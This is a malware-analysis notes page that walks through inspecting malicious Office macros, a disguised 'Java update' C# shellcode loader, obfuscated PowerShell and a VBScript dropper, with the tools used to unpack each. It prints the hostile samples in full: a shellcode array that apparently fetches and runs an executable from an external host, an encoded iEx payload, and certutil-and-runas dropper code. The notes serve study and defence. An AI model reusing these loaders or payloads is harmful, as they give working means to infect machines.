---
title: Notes | Malware Types
author: Zeropio
date: 2022-09-09
categories: [Notes, Malware]
tags: [malware]
permalink: /notes/malware/types
---

# Maldoc

## Excel

Sometimes malicious files can come from and **xlsm** file. Excel files are like a ZIP files, when you open one you are really opening a bunch of files. We can try `unzip` it:

```console
remnux@remnux:~/excel$ unzip sheetsForFinancial.xlsm 
Archive:  sheetsForFinancial.xlsm
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/sharedStrings.xml    
  inflating: xl/vbaProject.bin       
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/printerSettings/printerSettings1.bin  
  inflating: docProps/core.xml       
  inflating: docProps/app.xml
```

We can see a binary in `xl/vbaProject.bin`{: .filepath}. We cannot get anything by using `cat` on it, but we have the `oledump.py` function in remnux.

```console
remnux@remnux:~/excel$ oledump.py sheetsForFinancial.xlsm 
A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        86 'PROJECTwm'
 A3: M    7829 'VBA/Module1'
 A4: m    1196 'VBA/Sheet1'
 A5: m    1204 'VBA/ThisWorkbook'
 A6:      3130 'VBA/_VBA_PROJECT'
 A7:      4020 'VBA/__SRP_0'
 A8:       272 'VBA/__SRP_1'
 A9:      3892 'VBA/__SRP_2'
A10:       220 'VBA/__SRP_3'
A11:       680 'VBA/__SRP_4'
A12:       106 'VBA/__SRP_5'
A13:       464 'VBA/__SRP_6'
A14:       106 'VBA/__SRP_7'
A15:       562 'VBA/dir'
```

Take into account the **A3** line. That `M` means that there is a macro there. We are gonna use the `-s` flag to get the strings, while specifying the third module:

```console
remnux@remnux:~/excel$ oledump.py -s 3 sheetsForFinancial.xlsm
```

This will output a huge hex dump. Add a `-S` to the previous command to skip the hex and just output the strings. These prints the strings in columns. If we want to try formatting it we must use the flag `--vbadecompresscorrupt`.

```console
remnux@remnux:~/excel$ oledump.py -s 3 --vbadecompresscorrupt sheetsForFinancial.xlsm
```

## Word

We can repeat the same steps from before. We can use the same command, `oledump.py`:

```
C:\Users\zeropio\Desktop
λ oledump.py bookReport.docm
A: word/vbaProject.bin
 A1:       418 'PROJECT'
 A2:        71 'PROJECTwm'
 A3: M    5050 'VBA/NewMacros'
 A4: m     938 'VBA/ThisDocument'
 A5:      2891 'VBA/_VBA_PROJECT'
 A6:      1505 'VBA/__SRP_0'
 A7:       144 'VBA/__SRP_1'
 A8:       214 'VBA/__SRP_2'
 A9:       220 'VBA/__SRP_3'
A10:       570 'VBA/dir'

C:\Users\zeropio\Desktop
λ oledump.py -s 3 --vbadecompresscorrupt bookReport.docm
```

We can move in the word files removing the extension and adding **zip** to it. For templates file we can found the following file: `\word\_rels\settings.xml.rels`{: .filepath}. If we see this file we can see a **Target=”…”** field that aims to a local file where the template is located.

For malware, this target can be changed to something different from a local file. For example it can target a web with a **/macro.dotm**, so when we open the template the macro is executed.

---

# Shellcode

Take the following C# code for a Java Update:

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace JavaUpdate
{
    class JavaUpdater
    {
        public static void updtatejava()
        {
            byte[] rsrc = new byte[464] {0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x89,0xe6,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xff,0x57,0x57,0x57,0x57,0x56,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0xeb,0x63,0x5b,0x31,0xc9,0x51,0x51,0x6a,0x03,0x51,0x51,0x68,0xbb,0x01,0x00,0x00,0x53,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0xeb,0x4f,0x59,0x31,0xd2,0x52,0x68,0x00,0x32,0xa0,0x84,0x52,0x52,0x52,0x51,0x52,0x50,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x89,0xc6,0x6a,0x10,0x5b,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x31,0xff,0x57,0x57,0x57,0x57,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x4b,0x0f,0x84,0x71,0x00,0x00,0x00,0xeb,0xd1,0xe9,0x87,0x00,0x00,0x00,0xe8,0xac,0xff,0xff,0xff,0x00,0xeb,0x6b,0x31,0xc0,0x5f,0x50,0x6a,0x02,0x6a,0x02,0x50,0x6a,0x02,0x6a,0x02,0x57,0x68,0xda,0xf6,0xda,0x4f,0xff,0xd5,0x93,0x31,0xc0,0x66,0xb8,0x04,0x03,0x29,0xc4,0x54,0x8d,0x4c,0x24,0x08,0x31,0xc0,0xb4,0x03,0x50,0x51,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0x2d,0x58,0x85,0xc0,0x74,0x16,0x6a,0x00,0x54,0x50,0x8d,0x44,0x24,0x0c,0x50,0x53,0x68,0x2d,0x57,0xae,0x5b,0xff,0xd5,0x83,0xec,0x04,0xeb,0xce,0x53,0x68,0xc6,0x96,0x87,0x52,0xff,0xd5,0x6a,0x00,0x57,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,0x6a,0x00,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0xe8,0x90,0xff,0xff,0xff,0x6a,0x61,0x76,0x61,0x75,0x70,0x64,0x61,0x74,0x65,0x2e,0x65,0x78,0x65,0x00,0xe8,0x0c,0xff,0xff,0xff,0x62,0x75,0x72,0x6e,0x2e,0x65,0x63,0x32,0x2d,0x31,0x33,0x2d,0x37,0x2d,0x31,0x30,0x39,0x2d,0x31,0x32,0x31,0x2d,0x75,0x62,0x75,0x6e,0x74,0x75,0x2d,0x32,0x30,0x30,0x34,0x2e,0x6c,0x6f,0x63,0x61,0x6c,0x00 };
            
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr Address = WinAPI.VirtualAlloc(IntPtr.Zero, rsrc.Length, WinAPI.MEM_COMMIT, WinAPI.PAGE_READWRITE);
            if (Address == IntPtr.Zero)
            {
                return;
            }
            Marshal.Copy(rsrc, 0, Address, rsrc.Length);
            if (!WinAPI.VirtualProtect(Address, rsrc.Length, WinAPI.PAGE_EXECUTE_READ, out uint OldProtect))
            {
                WinAPI.VirtualFree(Address, 0, WinAPI.FreeType.MEM_RELEASE);
                return;
            }
            hThread = WinAPI.CreateThread((IntPtr)0, 0, Address, IntPtr.Zero, 0, ref threadId);
            if (hThread == IntPtr.Zero)
            {
                WinAPI.VirtualFree(Address, 0, WinAPI.FreeType.MEM_RELEASE);
                return;
            }
            WinAPI.WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
    //
}
```

This is a usual shellcode. Starts by taking a section of memory and allocate it to a particular size. Then copy the bytes from resource into this address:

```csharp
 Marshal.Copy(rsrc, 0, Address, rsrc.Length);
```

It will check the memory protection and then create a thread. This will execute whatever is in the array, in this case the shellcode:

```csharp
hThread = WinAPI.CreateThread((IntPtr)0, 0, Address, IntPtr.Zero, 0, ref threadId);
```

And at least it will put the thread in a wait state for a indifinite amount of time, so the process will not show in the process list:

```csharp
WinAPI.WaitForSingleObject(hThread, 0xFFFFFFFF);
```

The real issue comes with this bytes:

```csharp
byte[] rsrc = new byte[464] {0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x89,0xe6,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xff,0x57,0x57,0x57,0x57,0x56,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0xeb,0x63,0x5b,0x31,0xc9,0x51,0x51,0x6a,0x03,0x51,0x51,0x68,0xbb,0x01,0x00,0x00,0x53,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0xeb,0x4f,0x59,0x31,0xd2,0x52,0x68,0x00,0x32,0xa0,0x84,0x52,0x52,0x52,0x51,0x52,0x50,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x89,0xc6,0x6a,0x10,0x5b,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x31,0xff,0x57,0x57,0x57,0x57,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x4b,0x0f,0x84,0x71,0x00,0x00,0x00,0xeb,0xd1,0xe9,0x87,0x00,0x00,0x00,0xe8,0xac,0xff,0xff,0xff,0x00,0xeb,0x6b,0x31,0xc0,0x5f,0x50,0x6a,0x02,0x6a,0x02,0x50,0x6a,0x02,0x6a,0x02,0x57,0x68,0xda,0xf6,0xda,0x4f,0xff,0xd5,0x93,0x31,0xc0,0x66,0xb8,0x04,0x03,0x29,0xc4,0x54,0x8d,0x4c,0x24,0x08,0x31,0xc0,0xb4,0x03,0x50,0x51,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0x2d,0x58,0x85,0xc0,0x74,0x16,0x6a,0x00,0x54,0x50,0x8d,0x44,0x24,0x0c,0x50,0x53,0x68,0x2d,0x57,0xae,0x5b,0xff,0xd5,0x83,0xec,0x04,0xeb,0xce,0x53,0x68,0xc6,0x96,0x87,0x52,0xff,0xd5,0x6a,0x00,0x57,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,0x6a,0x00,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0xe8,0x90,0xff,0xff,0xff,0x6a,0x61,0x76,0x61,0x75,0x70,0x64,0x61,0x74,0x65,0x2e,0x65,0x78,0x65,0x00,0xe8,0x0c,0xff,0xff,0xff,0x62,0x75,0x72,0x6e,0x2e,0x65,0x63,0x32,0x2d,0x31,0x33,0x2d,0x37,0x2d,0x31,0x30,0x39,0x2d,0x31,0x32,0x31,0x2d,0x75,0x62,0x75,0x6e,0x74,0x75,0x2d,0x32,0x30,0x30,0x34,0x2e,0x6c,0x6f,0x63,0x61,0x6c,0x00 };
```

If these bytes are are benign we should be fine, but if these bytes are malicious we have malware here. We can use the following Python script to make the array into a readable format:

```python
#!/usr/bin/env python3

with open("payload.txt", "r") as f:
	hex_string = f.read().replace("0x", "").replace("byte[] rsrc = new byte[464] {", "").replace("};", "").replace(",", "")
	hex_encode = hex_string.encode()

with open ("out.bin", "wb") as out:
	out.write(hex_encode)
```

Take the **out.bin** file and pass it through `scdbg`:

```
C:\Users\zeropio\Desktop
λ scdbg /f out.bin -s -1
```

| Flag | Description |
| --- | --- |
| /f | Pass a file |
| -s | Number of iterations. Set -1 for unlimited |

---

# Off-Script

## PowerShell

PowerShell is the interpreter for .NET framework. Take the following ps1 file:

```powershell
iEx(nEW-ObJECt  Io.CoMpRESSiOn.defLaTEstReam([iO.memoRYStREam][sYsteM.coNvert]::FROmbaSe64StRiNG( 'tVVpbxMxEP2cSv0PVhqhRLAm6cVRgVTSg0q91EScQsi7mSSmjr14vWlLyX/H115JKEUUJ9pj5s2befbYu7b2MKO+s7qyhh5k3M11Lq5A9sbAGLqAKcgEUL97jqYbeOuvuRZHeIOOpoSjHuURXP4b113Dcx1S9TYNkYRYJFQJeYOIQiOqxmmIIzF5SnUtQWJreRob4YkRHkgnPFBRjHOuAwCGhhIAKYEGghMFKKQqEpQb1s4b+elku//s8MXF6fNpSEI+/JBunmwfx6Mf6vv2x84m/i8aH2oYMvNrRIwCV+gVavCUMW1tJEoCmZQtYTocgixbriRVVcuAKFJ+l5CkrMyr9HLcrq4YKQ0aa0e908bm39nCnY2698RCmqDO5sbG6kqtqO4UroKz8BtESj8q3BPRJagE96O4ayFNzfnEhbd2TGShwnHgQ1A9a2s6QC6qRP3mRsHnL6jTXt+0GOCRGFA+qqL6cK3wbhJRuu/9FpzPSQl6dIZd0vfW2fRltUoBeDdV4oClydgUq2QKrjxdSqItbfM2EGbqanmIZWvWz3uv65YqBxRxPhO+ADJoerFPUFvPkXvGx8BHauzCa3SImj40GCnUbnm6Wr6u9v4Y5VPi51M/zbEbEs86M9cZuhpTBijTjvc00+6UUEZCBg75u/SV7LgvqV88H2GtTsdc2b7ZalZC3opHfCouIdi/jrUpoYKjoCsmE8IHXt/660cd9BOdpSpw2lwyrSEiKhovoWx8xfvXEcTKsC2LdLcuAyKDd0RSIxoFp2QCqG5y1j2wwZwOTenIvTDvtnrZMql6k4jU7pG2xxbdsBAI88uPblHRMhXXDpohYPp7UEawzJXRVzsyKz1Jw8T3hi0u74vWTh7oqn78yrsKR1bsvKdopMo8ZO7lU+wKqldWw7WlvhSM5d7T2PJ6V5YYH3EOsng90X1ERmBDhpQTxlzf2Vn3B0LAwR2Creom7jKRgO/nzLZHk7iwLpfkoFbSLEvlT7uFVH7LVVJl2/AeqRy0msofyQup/DFbSeVt90nloNVU/oheSOX71BLdSeqAVVK/dedJ/9g+OYE9Ke4Xnm9wE/y5d5MomODD7peXL7uCMf2BsNXPfgE=' ), [sYsTem.io.comprEsSIOn.CoMPReSsIONmOdE]::dEcOMpresS) | % {nEW-ObJECt SYsteM.Io.strEAmReAder($_,[SysTEm.TExT.eNCoDIng]::aSCIi) }| % { $_.reaDtoEnD()})
```

This is a obfuscate PowerShell script. We can get from the first characters that it is a base64 encode:

```powershell
nEW-ObJECt  Io.CoMpRESSiOn.defLaTEstReam([iO.memoRYStREam][sYsteM.coNvert]::FROmbaSe64StRiNG(
```

Then it decompress the string:

```powershell
[sYsTem.io.comprEsSIOn.CoMPReSsIONmOdE]::dEcOMpresS)
```

Now let’s take a look at the command. Removes the `iEx(...)` and pass the rest of the command in a PowerShell variable. Now this command doesn’t have execution, but we can see the output of it.

```
PS C:\Users\zeropio\Desktop > write-host $megaSus
```

And now we have the code of it.

## VBScript

This scripts are a richer version of bash scripts. We have the following code in a **vbs** file:

```powershell
Dim WshShell, oExec
Set WshShell = CreateObject("WScript.Shell")

Set oExec = WshShell.Exec("certutil -decode one.crt C:\Users\Public\Documents\one.vbs")
WScript.Sleep 1000
Set oExec = WshShell.Exec("certutil -decode two.crt C:\Users\Public\Documents\xml.xml")
WScript.Sleep 1000
Set oExec = WshShell.Exec("cmd.exe /c C:\Users\Public\Documents\one.vbs")
```

If we executed it we have the following new **vbs** file generated:

```powershell
getUpdate()

Sub getUpdate()
a = "CvVv:vVv\vVvWvVvivVvnvVvdvVvovVvwvVvsvVv\vVvMvVvivVvcvVvrvVvovVvsvVvovVvfvVvtvVv.vVvNvVvEvVvTvVv\vVvFvVvrvVvavVvmvVvevVvwvVvovVvrvVvkvVv\vVvvvVv4vVv.vVv0vVv.vVv3vVv0vVv3vVv1vVv9vVv\vVvMvVvSvVvBvVvuvVvivVvlvVvdvVv.vVvevVvxvVvevVv"

aa = "CvVv:vVv\vVvuvVvsvVvevVvrvVvsvVv\vVvPvVvuvVvbvVvlvVvivVvcvVv\vVvDvVvovVvcvVvuvVvmvVvevVvnvVvtvVvsvVv\vVvxvVvmvVvlvVv.vVvxvVvmvVvlvVv"

aaa = update(a, "vVv")
aaaa = update(aa, "vVv")

Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
    obj.Document.Application.ShellExecute aaa, aaaa, Null, "runas", 0

End Sub
Function update(ccj, jjc)
Dim str
str = Replace(ccj, jjc, "")
update = str
End Function
```

We have what it seems to be a obfuscated piece of code, by changing their variables into some weird names so it’s more difficult to understand it at first glance. We can use the find and replace function from many code software to start replacing the variables names into some understandable one.

Removing the `vVv` string from the code will clean the first part. The `C08AFD90-F2A1-11D1-8455-00A0C91F3880` seems to be a UID. We can search it on the internet to get an idea of what it is, exactly it will be [this](https://docs.microsoft.com/en-us/windows/win32/shell/shell-shellexecute). This piece of code will execute a XML file, which have a shellcode.

---

# C# Malware

When you start with a sample you may not know in what language is written. In this case, C# use .NET framework for execution, which uses **CLR** (**Common Language Runtime**), before getting to the OS. At the other hand, for compile a C# code into a binary, after passing through the C# compiler it goes to the **IL** (**Intermediate Language**). The **IL** acts as a broker for the C# compiler and **CLR**.

For C# malware, when we use a tool like `floss` the output will print a bunch of clear text, more than often. The **IL** is loaded into the binary, that is why we can get the clear text functions. This make C# easily reverse engineering.

To recover the code we will use `dnSpy` to recover all the **IL** code. Open a file with it. For a **dll** file we can go to `EmbedDLL > EmbedDLL.dll > EmbedDLL > Program` to see the source code. 

We can’t run a **dll** without a program, so checking the code we can find a major function to run it as a vessel. We can use `rundll32` for it:

```
C:\Users\zeropio\Desktop
λ rundll32.exe <DLL FILE>,<FUNCTION>
```

---

# Go Malware

Go can compress compile can support all the functions from any language. Usually `floss` print many strings from a binary compile from Go. These strings are a huge proof that is a Go code, like lines refering to code resources, Go version or in HTTP request there can be a Go header.

Use `Pe-bear` with the sample and search for `.symtab` .

---

# Mobile

For a brief introduction, we must use **MobSF** to perform an analysis.
